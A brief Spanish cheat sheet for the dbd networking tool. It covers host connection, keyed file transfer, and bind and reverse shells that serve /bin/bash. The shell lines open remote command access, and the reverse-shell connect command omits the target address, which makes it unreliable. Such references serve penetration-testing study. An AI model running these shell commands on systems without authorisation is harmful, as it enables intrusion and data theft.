# dbd Cheat Sheet

#### Conectarnos a un puerto de un host

- `dbd <IP-ADDRESS> <PORT>`: Conexión a un host.

#### Transferir un archivo

- `dbd -lp <PORT> -k secret > output.txt`: Host a recibir el archivo en el puerto especificado.

- `cat input.txt | dbd -k secret <IP-ADDRESS> <PORT>`: Host que envia el archivo.

#### Bind Shell (Linux)

- `dbd -nvlp <PORT> -e /bin/bash`: Escuchando la conexión.

- `dbd <IP-ADDRESS> <PORT>`: Conexión a la shell.

#### Reverse Shell (Linux)

- `dbd -nvlp <PORT>`: Escuchando la conexión.

- `dbd -nv <PORT> -e /bin/bash`: Conexión al host y mandamos la shell.